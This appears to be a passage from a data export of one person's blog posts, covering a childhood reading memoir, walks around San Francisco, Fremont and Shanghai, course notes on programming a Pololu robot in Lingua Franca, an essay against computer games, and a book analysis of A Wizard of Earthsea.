That was in fifth grade when my primary school\nheld a program called Readathon.</p>\n<p>I described my attitude toward reading in fourth-grade in an\nautobiography:</p>\n<p>\u201cI didn\u2019t like reading at all. I could only read books that only have\nfour lines on a page. My parents made me do it, and I thought it was\nboring.\u201d</p>\n<p>Here\u2019s the feeling inside me when I went to the library:</p>\n<p>\u201cSeeing so many books made me kind of scared and amazed; I was hoping\nto find a good book when I spotted Junie B. Jones Aloha-ha-ha on a\nshelf. I got interested in the title of this book, so I borrowed it and\nstarted to read it.</p>\n<p>When I started reading, I found out that this book is so funny. There\nwere almost twenty lines on a page. I was so surprised and proud that I\ncould read forty-five pages in one day, five times than before.\u201d</p>\n<p>Reading is not a thing to be forced. One must be interested in\nreading in order to learn. For example, when my mother forced me to read\nin fourth grade, I didn\u2019t like reading at all. However, when I was\ninterested myself, I read so much that I couldn\u2019t believe it myself.</p>\n<p>**Note of author re-reading this material at 2023 in university, I\npractically hate everything that is assigned to me, even till now.\nHowever, I find a strange passion in certain things I came across, like\nLinux and frontend development</p>\n<p>But how to be interested in reading? Don\u2019t start with 300\nhundred-page novels or classics with words all over the pages, start\nwith simple books that make you interested, and every time when you\nstart a new series, increase the level a little bit. After weeks,\nmonths, and years, you will certainly be surprised. I was in fifth grade\nwhen I read Junie B., a first-grade level book. I was even impressed\nthat I read a book with only fifteen lines, forty-five pages a day.\nFunny, isn\u2019t it? However, I read the Narnia series less than a year\nafter it, and the Harry Potter series after 18 months.</p>\n<p>Don\u2019t be too happy, of course. All of these achievements are based on\nthe genuine love of the book. Don\u2019t care about your speed, but how much\nyou can get, what you can learn, and what the author wants to tell us\nafter reading a book. Don\u2019t be ashamed that you aren\u2019t the best reader\nin class. Reading is a long-term activity.</p>\n<p>After reading one of Junie B.\u2019s books, I also borrowed A to Z\nmysteries, Magic Tree House, and Ready Freddy. I finished one book from\neach series. I was amused because of the fun it brought to me, the\nwonderful adventures in these books.</p>\n<p>As the saying goes: A reader lives a thousand lives before he dies.\nThe man who never reads lives only one. I believe it because, as a\nmatter of fact, I think I have already lived more than one life. Every\ntime I opened a book, I became the main character, and I laughed and\ncried with them. I live the lives of the character in the book.\nSometimes, I was so into one book that it was seconds after I closed the\nbook that I realized that I am in my house, not in one of those\nadventures.</p>\n<p>Junie B is a funny series about Junie B.\u2019s kindergarten and\nfirst-grade life. I laughed so much when reading it my stomach hurts. It\ndescribes life in a first grader\u2019s eyes vividly and its language amazed\nme. I still used some of them in my compositions.</p>\n<p>It is a really easy series for me now. Last year I went to a Barnes\n&amp; Noble bookstore in California when I found it. I read a book again\nin about 10 minutes. So don\u2019t be disappointed. You can improve much much\nfaster than you ever dreamed.</p>\n<p>That was the start of my reading career. The next series is Magic\nTree House. I think many people know this series so I am not going into\ndetails, just to talk about the series in my eyes.</p>\n<p>I am now going to tell you a thing more even more hilarious. I\ncouldn\u2019t understand what the first book is about when I first started to\nread it. It was not until I read it the second time that I began to\nunderstand. Then I was amused by the adventures of Jack and Annie, who\nsaved so many people from disasters and helped the great man to success.\nI began to understand the rest of the series after I finished the first\none.</p>\n<p>I read the whole Magic Tree House series, all 57 of them. It almost\nbecame a tradition for me to borrow a book from the school library\nbefore lunch, read through the lunch break, and read through the class\nbreak in the afternoon. I usually finish it before school ends and\ndevote my time at home doing homework, studying math, and doing\nexercises.</p>\n<p>After winter vacation, I didn\u2019t enjoy some other book series. They\nhave the same style and it was so boring reading them. However, I later\nfound some series as good as Junie B series.</p>\n<p>I read many mystery novels. A mystery involves a puzzle to be sold\n(usually a crime). The author introduces the crime and gives clues to\nthe readers. The clues give readers an impression of the crime.</p>\n<p>Mystery usually has a complicated process of analysis. It makes a\nbook fascinating to read when readers are trying to figure out the\ntruth. But also in this process of solving the crime, the author gave\nthe characters a detailed description, usually concerning their\nreactions and attitudes toward the crime. This often shows the\npersonalities of people and the meanings behind them.</p>\n<p>Now I\u2019ve read many books, from easy ones to thousand-page ones. I\nhave also read many young adult books, and fantasies. Reading is a\nprocess to be enjoyed by everyone, to remove the stress in everyday\nlife.</p>\n",

        "body": "<h2 id=\"why\">Why?</h2>\n<p>So today I was kind of restless and found myself not doing anything\nat all, so I went to visit North San Francisco. I went on the Bart and\nthen got off at Embarcadero.</p>\n<h2 id=\"shoreline\">Shoreline</h2>\n<p>So I walked to the shoreline. There are many tall buildings in San\nFrancisco, much more crowded than Berkeley. The buildings reminded me of\nthe skyscrapers besides Huangpu River, but of course Huangpu River is\nlike much smaller than the Bay,</p>\n<p>The roads are like really wide, and many people are selling different\nfood, smelling good in the air. Mostly I saw sausages and fruits, but I\nsuppose they are kind of lack hygiene. I could see across the Bay to\nTreasure Island, and Golden Gate Bridge.</p>\n<p>The streets are dirty, and there are many homeless people lying all\naround. There are many cruises and many large boats parked along the\nshoreline which I suppose is for a tour for the people.</p>\n<p>It kind of reminded me of Anchorage, but Anchorage is much cleaner\nand much less crowded and less windy. I already wanted to visit Alaska\nagain, but it takes a lot of money.</p>\n<p>Then I walked along for a while, and on my left was a small hill. I\nkept walking and there was a entertainment park, filled with many small\nrestaurants alongside.</p>\n<p>Then the wind grew strong and almost unbearable, and I didn't want to\nwalk anymore, so I tried going to Powell Street, since there is a Bart\nstation there, and also I wanted to go to Adidas to buy pants.</p>\n<h2 id=\"chinatown\">Chinatown</h2>\n<p>Walking from the shoreline the streets became very dirty and very\nsmall. There are tall buildings alongside and it was very hilly. I\nwalked around and kind of lost direction in Columbus Avenue, going one\nway then going the other way. I walked into Chinatown, and it was very\ndirty. There are a group of like 30 elders in sitting around and playing\nlike poker of something, which reminds of those senior people back in\nChina, and they look kind of alike. I wonder how they felt living here,\nin this crowded city. Some people told me seniors wanted to go back to\ntheir hometown, like \"falling leaves returning to the root\", and I\nthought that they might me lonely and nostalgic or something, but\nanyways, I didn't bother to think more.</p>\n<p>Then I thought I probably would want to live in a less crowded place\nand quieter place when I got like 70 years old, but that's not my\nbusiness now anyways.</p>\n<p>There are a bunch of Chinese restaurants in Chinatown, but most are\nclosed. Then there are some other services. But there are also many\nhomeless people looking like Asian.</p>\n<h2 id=\"market-street\">Market Street</h2>\n<p>Then I walked to market street. It was only my third time to San\nFrancisco (last time I was watching Mean Girls musical, and the time\nbefore my parents' car broke down in Ocean Beach), and it felt quite\nqueer since I have already been here like forever. Anyways I went to\nlook for clothing store.</p>\n<p>Market street is full of smells of smoke and drugs, I think. Anyways,\nthere are bunch of homeless people there, but the shopping mall was\ngood.</p>\n<p>Then I went on the Bart at Powell Street and went home.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>San Francisco is crowded and a little dirty compared to Berkeley. It\nis also very hilly. Shanghai is much better since it is cleaner and\nthere wasn't homeless people. But visiting seems interesting. San\nFrancisco wouldn't be my top choice for living, though.</p>\n",

        "body": "<p>This post describes my journey with Pololu Robot and Lingua Franca\nlanguage.</p>\n<h2 id=\"why\">Why?</h2>\n<p>So this semester I am taking embedded system(because I had been\npractically declined from all other classes I am interested in and OS is\ntoo much work), and they use Pololu Robot and Lingua Franca, that's why\nI am learning them.</p>\n<h2 id=\"what\">What?</h2>\n<p>The class uses Pololu Robot RP2040 3pi+, and I need to connect a wire\nto the robot and run programs on my computer to make it execute\nstuff.</p>\n<p>I bought the robot for 200 dollars since I was very curious, and\ndidn't want to work only in the labs but also work at home.</p>\n<p>Lingua Franca is a little like React Nodejs to be honest, and when I\nfirst started with React I was very bad (I still wasn't really good at\nit), like it have all those reactors and trigggers to make the program\nwork. But mostly is just C Program, which I am also very bad at. As a\nresult, I faced obstacles and bugs at the start of the course, making me\nweary and sad indeed.</p>\n<p>But mostly it was because I am too stupid, and also I wasn't working\nhard enough.</p>\n<h2 id=\"chatgpt\">ChatGPT</h2>\n<p>Lingua Franca is a new and not so widely-used language, so ChatGPT\nhave limited abilities(unlike C or Python or Javascript), but it is\nstill very good in generating code. The only difference is that you have\nto manually debug with GPT's generation.</p>\n<h2 id=\"printf\">Printf</h2>\n<p>So basically I had a really hard time making the printf statements in\nLingua Franca work. At the end it turned out everything was fine except\nthat the manuel wan't clear and the TA had limited experience.</p>\n<p>So basically connect and make it bootsel mode (RP1-RP2 appearing in\nthe media) and run</p>\n<pre><code>lfc src/[program].lf &amp;&amp; picotool load -x bin/[program].elf -f\nsudo screen /dev/ttyACM0 115200</code></pre>\n<p>The problem was I couldn't find the ttyACM when connected, and it was\nbecause I hadn't used picotool to load the program into the robot. And\nit took so long for TA to figure it out. But anyways it went fine.</p>\n<h2 id=\"display\">Display</h2>\n<p>First import the library.</p>\n<pre><code>import Display from &quot;lib/Display.lf&quot;</code></pre>\n<p>Then, use a New Display and set the line0</p>\n<pre><code>    d = new Display()\n    reaction() -&gt; d.line0 {=\n        static char buf0[17];\n        snprintf(buf0, 17, &quot;dsfasdfsadf&quot;);\n        lf_set(d.line0, buf0);\n    =}</code></pre>\n<h2 id=\"logical-time-vs-physical-time\">Logical time vs Physical\nTime</h2>\n<p>Logical Time: In LF, logical time is used to order events in a\npredictable manner within the model, independent of the actual passage\nof real-world time. Physical Time: Physical time in LF is used when the\nmodel needs to interact with the physical world or external components\nthat operate in real-time.</p>\n<p>Also, their types are different, and not specifying the right type,\nlike ld vs lld can cause problems. This is an example of correctly\nprinting out</p>\n<pre><code>int64_t x=lf_time_logical();\nint64_t y=lf_time_physical();\nprintf(&quot;Physical Action Triggered: Logical Time: %lld msec, Physical Time: %lld msec\\n&quot;, x/1000000,y/1000000);</code></pre>\n<p>An example code to demonstrate the difference</p>\n<pre><code>main reactor {\n  physical action tick\n\n  reaction(startup) -&gt; tick {=\n    lf_schedule(tick, 0); // 1 second in nanoseconds\n  =}\n\n  reaction(tick) -&gt; tick {=\n    int64_t logical_time = lf_time_logical();\n    int64_t physical_time = lf_time_physical();\n    printf(&quot;Function Enters: Logical Time: %lld msec, Physical Time: %lld msec\\n&quot;,\n      logical_time / 1000000,\n      physical_time / 1000000);\n\n    while (lf_time_physical() &lt; physical_time + 300000000);\n\n    int64_t logical_time_after = lf_time_logical();\n    int64_t physical_time_after = lf_time_physical();\n    printf(&quot;After Delay: Logical Time: %lld msec, Physical Time: %lld msec\\n&quot;,\n      logical_time_after / 1000000,\n      physical_time_after / 1000000);\n\n    lf_schedule(tick, 1000000000); // Schedule the next occurrence of tick.\n  =}\n}</code></pre>\n<p>prints out</p>\n<pre><code>Function Enters: Logical Time: 3902 msec, Physical Time: 3902 msec\nAfter Delay: Logical Time: 3902 msec, Physical Time: 4202 msec\nFunction Enters: Logical Time: 5202 msec, Physical Time: 5203 msec\nAfter Delay: Logical Time: 5202 msec, Physical Time: 5503 msec\nFunction Enters: Logical Time: 6503 msec, Physical Time: 6503 msec\nAfter Delay: Logical Time: 6503 msec, Physical Time: 6803 msec\nFunction Enters: Logical Time: 7803 msec, Physical Time: 7803 msec\nAfter Delay: Logical Time: 7803 msec, Physical Time: 8103 msec\nFunction Enters: Logical Time: 9103 msec, Physical Time: 9103 msec</code></pre>\n<h2 id=\"input-and-output\">Input and Output</h2>\n<p>We can get input basically from the output of another reactor, and\nthen specifying the output to input, for example, below is a code that\npasses x and y to the Destination reactor, then outputs the sum. Write\n<code>s.x -&gt; d.x</code> to pass it.</p>\n<pre><code>reactor Source {\n  output x: int\n  timer t(0, 1 sec)\n\n  reaction(t) -&gt; x {=\n    lf_set(x,1);\n  =}\n}\n\nreactor Destination {\n  input x: int\n\n  reaction(x) {=\n    if (x-&gt;is_present) {\n      printf(&quot;Received %d.\\n&quot;, x-&gt;value);\n    }\n  =}\n}\n\nmain reactor {\n  s = new Source()\n  d = new Destination()\n  s.x -&gt; d.x\n}</code></pre>\n<h3 id=\"mutable-input-and-arrays\">Mutable Input and Arrays</h3>\n<p>So input is usually not mutable, but we can set it. Below is an\nexample of modifying array</p>\n<pre><code>reactor Source {\n  output data: int[10]\n  timer t(0, 1 sec)\n  reaction(t) -&gt; data {=\n    for(int i = 0; i &lt; 10; i++) {\n        data-&gt;value[i] = i;\n    }\n    lf_set_present(data); // Notify that the output data is set\n  =}\n}\n\nreactor Processor {\n  mutable input data: int[10]\n  reaction(data) {=\n    if(data-&gt;is_present) {\n        for(int i = 0; i &lt; 10; i++) {\n            printf(&quot;%d &quot;, data-&gt;value[i]);\n        }\n        //0 1 2 3 4 5 6 7 8 9\n\n        // Modify the mutable input directly\n        for(int i = 0; i &lt; 10; i++) {\n            data-&gt;value[i] += 2023;\n        }\n\n        for(int i = 0; i &lt; 10; i++) {\n            printf(&quot;%d &quot;, data-&gt;value[i]);\n        }\n        //2023 2024 2025 2026 2027 2028 2029 2030 2031 2032\n    }\n  =}\n}\n\nmain reactor {\n  src = new Source()\n  proc = new Processor()\n\n  src.data -&gt; proc.data\n}</code></pre>\n<h2 id=\"robot-going-in-a-square\">Robot Going in a Square</h2>\n<p>So after a while I wrote a program to make the robot go in a\nsquare.</p>\n<p>Here is the video</p>\n<div class=\"iframe\">\n<div style=\"display:none\">\n<div id=\"one-google-bar\"\nclass=\"ndfHFb-c4YZDc-Woal0c-jcJzye-ZMv3u ndfHFb-c4YZDc-n1UuX-Bz112c\">\n<div id=\"gb\" class=\"gb_Pa gb_ld gb_gb gb_i gb_Oc\"\nstyle=\"background-color:transparent\">\n<div class=\"gb_Bd gb_eb gb_qd\" data-ng-non-bindable=\"\" data-ogsr-up=\"\"\nstyle=\"padding:0\">\n<div class=\"gb_Ud\" style=\"display:block\">\n<div class=\"gb_6c\">\n\n</div>\n<p><a\nhref=\"https://accounts.google.com/ServiceLogin?service=wise&amp;passive=1209600&amp;osid=1&amp;continue=https://drive.google.com/file/d/1AE_GnrjhE2oOE9Sab5sMXK-66zHhmCt1/preview&amp;followup=https://drive.google.com/file/d/1AE_GnrjhE2oOE9Sab5sMXK-66zHhmCt1/preview&amp;ec=GAZAGQ\"\nclass=\"gb_Ba gb_md gb_Od gb_i gb_me\" aria-label=\"\u767b\u5165\"\ntarget=\"_top\"><span class=\"gb_Kd\">\u767b\u5165</span></a></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div data-ng-non-bindable=\"\">\n\n</div>\n</div>\n",

I can learn about other people\u2019s lives, experiences, knowledge\nabout life reading books. I can learn about math and computer science\nwatching YouTube. Exercising can help build my body and relax. Doing\nhousework can help me feel comfortable. However, computer games have\nnone of these effects.</p>\n<p>Computer games require little skill to understand and play. They are\nsimple and boring\u2013everybody is alike in the game. You cannot learn\nanything by playing computer games.</p>\n<h3 id=\"time-consuming\">Time consuming</h3>\n<p>Computer Games result in wasting much of my spare time. What\u2019s more,\nI always play more than I intend to. For example, once I started playing\n\u201czombsroyal\u201d, I usually can\u2019t stop and keep on playing for four hours.\nComputer Games are simply too addicting, their effects just like drugs.\nOne can easily spend an entire day doing nothing and playing computer\ngames, and not even noticing time passing. I have just so much more time\nto do other things if I quit computer games.</p>\n<p>Some people might argue that \u201che is just tired,\u201d or he can\u2019t do\nanything much in these hours besides playing computer games. This sounds\nvery strange and absurd. When I am playing video games, my brain is\nstill doing work\u2013when I am playing \u201cgenerals\u201d or \u201c2048\u201d, I am always\nthinking about the strategies and how to win. A really tired person\ncan\u2019t play video games. Just taking a walk in the park, or reading a\nliterature book, or watching an inspirational video on YouTube, which\nusually takes about only 1 hour or less, one can easily put the time to\nuse!</p>\n<h3 id=\"long-recovery-period\">Long Recovery Period</h3>\n<p>After I play computer games, I always feel dizzy and disoriented\u2013I\nneed to rest and cannot go straight back to my work. However, when I\nfinished walking, or reading English books, or sleeping, I go back to\ndoing math fully refreshed. Playing computer games consumes not only the\ntime one spends looking at the screen, but also puts one in a\ndysfunctional state long after finishing. I cannot go back to studying\nafter playing video games. In fact, usually the whole day is wasted.</p>\n<h3 id=\"sleeping-trouble\">Sleeping trouble</h3>\n<p>Playing games brings excitement. Playing games at night may affect\none\u2019s sleep. Sometimes game addicts will stay up to 12:00 pm to play\ngames, which causes significant distress the next day. Sleeping is\nreally important to one\u2019s well-being, and one\u2019s efficiency of learning\nmath and computer science.</p>\n<h3 id=\"harmful-to-eyes\">Harmful to eyes</h3>\n<p>Since computer games are so addicting, one usually spends so much\ntime looking at the screen without even blinking, which can be very\nharmful to one\u2019s eyes. My eyes on August 2022 are 0.8 and 0.6, which\naren\u2019t very good. I should really take the matters seriously. Other\ncomputer activities, like coding or watching YouTube, don\u2019t require one\nto keep his eyes open all the time, leading to a less harmful effect on\nthe eyes. Doing outdoor activities are very good for the eyes,\nespecially after sitting in the classroom all day long.</p>\n<h3 id=\"harmful-to-health\">Harmful to Health</h3>\n<p>When I play games, I usually sit rigid for hours. I don\u2019t drink water\nor go to the bathroom, which can have a negative effect on the body.</p>\n<h3 id=\"getting-isolated\">Getting Isolated</h3>\n<p>Since playing games is something I can enjoy alone, I usually isolate\nmyself from society when playing video games. Thus, playing games stop\nme from making friends and communicating with my schoolmates\neffectively.</p>\n<h3 id=\"meaningless-life\">Meaningless life</h3>\n<p>Since games are immersive and addictive, one may easily forget about\nlife altogether after spending much time on games\u2013real life doesn\u2019t\nmatter that much, compared to the game. Instead of challenging and\ntrying to go through the difficulties\u2013tests, homework, competition, one\ntends to avoid and find a way of escaping, always into a game. One may\nconsider the game as an exit to all the sorrows and real hardships in\nlife. However, these problems always exist, and simply won\u2019t go away.\nThus, one adopts a negative attitude towards life and sneaks himself\naway from it. One will also turn a blind eye to his relatives or\nfriends. Since the game is meaningless, one\u2019s life is meaningless as\nwell.</p>\n<h3 id=\"inappropriate-behavior\">Inappropriate behavior</h3>\n<p>After playing gun games, one will sometimes try out the actions used\nin the games. One may constantly think about fighting\u2013committing crimes\nand murdering\u2013instead of studying math and computer science. Sometimes\ngame addicts don\u2019t like to sit down in a classroom and study math\nbecause they are too restless. Sometimes game addicts adopt the same\nkind of behavior towards his classmates, which leads to violent\nbehaviors and him being hated by all. Since there are usually those\nstrange sounds in games, one may choose to imitate them after playing\ntoo much. As a result, one may constantly speak profanity (words like\ndamn) and curse others. This is very inappropriate behavior, considered\nuncivilized and uneducated.</p>\n<h3 id=\"limited-ability\">Limited ability</h3>\n<p>Since games are simple and human reaction speed is limited, computer\nprograms can easily outplay human players. You can just never win a very\ngood computer program in a game. Spending more time studying machine\nlearning and computer science can bring about far more success in video\ngames. Thus, it is meaningless (everything is limited by the game-maker\nand players are manipulated) to play computer games yourself.</p>\n<h3 id=\"distracting-others\">Distracting others</h3>\n<p>Playing games usually includes a lot of mouse clicking or exclaiming,\nwhich can really disturb other students around you who are trying to do\nmath. The music in games and the flashing light also make people feel\nrestless. This is really annoying to others who are trying to do\nhomework.</p>\n<h2 id=\"why-i-should-quit\">Why I Should QUIT</h2>\n<p>It is obvious from the reasons above that the cons outweigh the pros.\nAt the same time, I obtain much more advantage from doing other\nactivities.</p>\n<h3 id=\"another-approach-to-the-pros\">Another Approach to the Pros</h3>\n<h4 id=\"helps-forget-things\">Helps forget things</h4>\n<p>Try sleeping at 8, or 7 pm at night.</p>\n<h4 id=\"instant-reward\">Instant reward</h4>\n<p>One really doesn\u2019t need to fill his brain with dopamine all day long.\nBeing excited causes multiple troubles for the brain itself.</p>\n<h4 id=\"react-faster\">React Faster</h4>\n<p>One really doesn\u2019t need to react faster to solve problems. Instead,\none should think deeply and thoroughly, and dedicate one\u2019s mind to the\nknowledge in order to do that.</p>\n",

Also, I heard that Fremont is really rich, so\nI wanted to there and see for myself.</p>\n<h2 id=\"how-did-i-go-there\">How did I go there?</h2>\n<p>I walked to North Berkeley Bart station (where I usually run to that\nstation at night), then took the Bart for like 30 minutes.</p>\n<h2 id=\"fremont-central-park\">Fremont Central Park</h2>\n<p>There is a beautiful park in the center, and a lake in the middle\ncalled Lake Elizabeth. The park is lovely, and many people are like\nwalking around the park. I realize there are no good parks around\nBerkeley, except for maybe Strawberry Creek Park, which is like smaller\nthan the forest area in the university. I went in and got a map of the\npark. Occasionally there are people speaking Chinese, but also some\nlooking like hispanic. There are no homeless people in the park. There\nis a series of hills across the park, and those are all yellow, which is\nkind of ugly.</p>\n<p>There are so called many activities in the central park, but I am not\ninterested in any of them.</p>\n<h2 id=\"mission-valley\">Mission Valley</h2>\n<p>After going out of the park there were no people on the roads, like\nno one at all, but there were many cars. I was wearing long sleeves and\nlong pants, and it became so hot in the late afternoon. I walked around\nMission Valley, so called \"rich neighbourhood\". Basically it is quiet\nand you do not see a lot of people on the streets (so food and restroom\nare hard to find). I figured since most people go out driving it won't\nbe a problem.</p>\n<p>However, there are many cars on the roads, like Paseo Padre Road. It\nis hard to cross the roads because there is almost no pedestrians at\nall, and I had to press the button to actually cross.</p>\n<p>There are many tall trees in the middle of the road, and overall it\nis nicer than Berkeley, but not all that good. I mean, you can see such\nneighbourhoods almost everywhere.</p>\n<h2 id=\"walking-long-distances\">Walking Long Distances</h2>\n<p>I walked around the neighbourhood, then went to Mission Community\nPark. It is overall not hilly compared to Berkeley, but traveling is\nextremely hard without a car, and in the end I walked many miles back to\nthe Bart Station, and there is a long distance between different Bart\nstations.</p>\n<p>I carried 1.5 L water and drank all the water, since there are no\ngrocery stores to refill.</p>\n<h2 id=\"dinner\">Dinner</h2>\n<p>There are, however, many restaurants out of the Bart Station, and I\nmanaged to find a very cheap and nice restaurant, and dinner cost me\naround 15 dollars, which is like the same price as Berkeley.</p>\n<p>On going back to the Bart I felt a little cold, since it was getting\ndark. I was sore and tired from walking, and there wasn't much to do and\nsee anyways.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Overall Fremont is better than Berkeley, since it is cleaner and\nthere are no homeless people. However, getting around is definitely\nharder. The scenery is medium, and those yellow hills are really ugly\nbehind the park. Overall it should be like 8 or 9 out of 10.</p>\n",

        "body": "<p>A Wizard of Earthsea is a classic fantasy novel written by Ursula K.\nLe Guin about fifty years ago. It won numerous awards and is popular\namong teenagars. The book has many morals in it. I will analyse it with\na description of its plot.</p>\n<p>Ged first learned magic from his aunt. With a gift in magic, he\nproved it when he saved his villagers from invaders. However, his aunt\nis a witch who knew little about magic and could not satisfy Ged. This\nled to Ged\u2019s hunger in learning magic and proving himself.</p>\n<p>Thus, when Ogion taught him almost nothing he became impatient, Ogion\nwanted to teach him to be silent and listen while he wanted to learn\nspells. He was arrogant and not contented, he wanted his talent in\nsorcery to be realized. That\u2019s why he couldn\u2019t stand the girl\u2019s teasing\nand released the shadow. But he wasn\u2019t strong enough that time and Ogion\nwas there to protect him. The shadow settled him and ceased his\narrogance for some time. But his decision to go to Role showed it was\nstill in his heart, and it would lead to danger at any second.</p>\n<p>When Ged arrived at Role, he began learning fast, contenting himself\nwith books and losing awe in everybody, even the Archmage, When Jasper\nlooked down on Ged, he desperately wanted to show himself, He wanted\neverybody to watch him with awe. At the feast, Ged forgot everything.\nThe only thing he wanted to do was to beat Jasper. When Jasper asked him\nto summon a spirit, he put the fear of the first shadow he released away\nfrom his mind. The first shadow showed Ged was a fool and he wanted to\nsay he wasn\u2019t. Though Ged verified himself at last, it led to the\nArchmage\u2019s death and his scar.</p>\n<p>Finally, Ged\u2019s brain cleared and realized he is nothing but a big\nfool. He lost everything he tried to get. He was self-conscience and\nguilty. He wanted to do something good. So, he became selfless, the one\nwho he should be at first.</p>\n<p>Ged, with his strong will and bravery, defeated the dragon and\nprotected the people of Low Torning; with his mind turned far from fame\nand wealth, withstand the lure of the stone to rule the world; with his\nstrong hate of his old self, followed Ogion\u2019s advice and went hunting\nafter the shadow. After much efforts Ged finally became whole again.\nThis book told us to stay modest and silent. The shadow represents the\ntedious and boring things in life we must do. We shouldn\u2019t let them\nbother us but face them bravely and defeat them. Only then, we can be\nwhole.</p>\n<p>Another thing to notice is that Ged is dark-shinned unlike other\nheroes. It showed that we needn\u2019t be white-skinned needn\u2019t be perfect to\nbe a hero or to do great hings.</p>\n<p>A Wizard of Earthsea is unlike any other fantasy books I\u2019ve read. It\nis not only a book for children but also for adults. It is to be read\nand taken in slowly. It is much serious in magic than any other novels.\nIt is a classic, still famous half a century after its publication.</p>\n",

Located in the north of the Pudong district,\nGreen City is the biggest international community in Shanghai and an\nideal place to live in.</p>\n<p>Being one of the richest communities in Shanghai, Green City is known\nfor its low density of people and high quality of life.</p>\n<p><img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/9c5e632e-217f-4cf9-a8d0-2970c904cbb6\"\nstyle=\"width:80.0%\" alt=\"image\" /><br />\nI live in Zhangjiang High-tech Park so I usually go there from Yunshan\nRoad. On the way between Longdong Avenue and Jinxiu Road, there is a\nsmall river, some luxurious houses, and a park in construction. There\nare no people and cars, yet the trees are in good order. I could see far\non that road and there aren\u2019t any tall buildings along the way. The\nroads are neat and organized. Everything is still. There are no\ninterfering roads in two kilometers.</p>\n<p>When I got on the bridge that crossed the river I saw the moon\nshining brightly in the sky. I could clearly see the paths along with\nthe river and feel the calmness of the river. Its surface is smooth and\ntakes in everything from above. The tall trees on two sides of the river\nand the streetlight that shows the way are in reflection. That is a time\nwhen I feel true to myself and free again, away from boundaries and\npressure in my daily life.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/bf6b4130-4f60-4053-a9f8-d6a12b3f88c9\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>It usually takes 40 minutes to walk to Jinxiu Road and another 15\nminutes to arrive at Biyun Road. There is a shopping center where I can\nbuy a bottle of water in Carrefour or eat dinner.</p>\n<p>They were constructing in later parts of Yunshan Road. They were\nbuilding line 18. I do not know when it will be finished. I hope it\nwould be finished sooner for I was counting on it to go to Yangpu\ndistrict a lot quicker that way. But I may not be in Shanghai by the\ntime it is finished.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/1d79ab03-f7a6-4ebe-8988-203f000f977c\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Green City is great for sport, too. There is a Decathlon and a\nstadium east of the shopping mall. Besides the stadium, there are also\nlots of restaurants. I remember Italian and American restaurants selling\ntheir local food. The food seems strange to me and as I am not\ninterested in eating as much as I am interested in walking, I usually\neat a simple meal at the shopping center.</p>\n<p>There is a swimming pool and as I walked through the stadium I could\nclearly see it. On my right side, there is a soccer field. I walked past\nand came to Lantian Road. The subway station is on Yanggao Road, about\n300 meters from me. I turned right and there is a park. The park looks\nsmall but it is long and really beautiful.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/8e837dfd-5f66-4365-84dd-a1654fb562dc\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>If you walk along Biyun Road to Hongfeng Street and keep walking, you\nmay find a path leading into a small river. There is an art museum along\nthe river. The museum is designed for ancient Chinese clothing and a\nwoman takes a picture of you on a seat if you want. The picture is taken\nand sent for free. The food and drinks in that art museum are really\nexpensive. There is a library in the museum.</p>\n<p>Keep on to the path on the side of the river and there is an office\npark. I entered it from small paths leading up from the river. There is\na pond inside it and there are many companies. The environment inside is\nreally good.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/0ac8e9ab-4bc5-4d23-a89b-9cd2d4e5ba60\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>On the intersection of Hongfeng Road and MingYue Road, there are two\nmarkets, one big and one small. From there you can buy a lot of exported\nthings. There is a bakery inside the big market called City Shop. There\nare different types of milk from Australia, America, and all over the\nworld in City Shop. There are also different types of snacks-chocolates,\nbiscuits-with no Chinese written on them. I usually come alone and don\u2019t\nhave much money or space in my bag for these things, so I usually just\nbuy water to drink.</p>\n<p>There are bars and restaurants along Hongfeng Road. But it is far\nfrom the restaurants in the city center. They are just small restaurants\nand are much quieter.</p>\n<p>I see lots of foreigners talking in bars and restaurants, people with\nwhite hair and mustache, young men with blonde hair, laughing and\ndrinking. None of them are too noisy. The restaurants are not crowded\nbut rather comfortable.<br />\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/60555d79-8f8a-4a44-a692-69fd5020a6c5\"\nstyle=\"width:80.0%\" alt=\"image\" /></p>\n<p>Then it was usually time for me to return home. As I went through the\ngardens and villas, I couldn\u2019t help but admire them. On Mingyue Road the\nroads are well-built and trees grow on both sides of the street. It is\nalways pleasant to walk between tall trees. On the smaller roads, there\nare chairs, and sitting there, I could see the schools and houses on\neither way of the street. There were some people coming and I saw that a\nfather riding bike with his son and telling him not to be naughty. I saw\nan elder woman returning home from shopping.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/a32fc141-e80e-45c2-8545-6d0adaf0ce98\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>I wanted to remain there all day. There is so much to see. What\nimpressed me is the beauty of life. Green City is the best neighborhood\nin Shanghai, but everything is so expensive. It is not only a green and\nbeautiful place but also a part where the culture is diverse, and life\ncan be peaceful and enjoyable.</p>\n",

I tried adb devices\nand adb start-server and adb kill-server but none of them responded, and\nI reinstalled it 3 times, and installed the platform-tools twice but it\nstill wouldn\u2019t work.

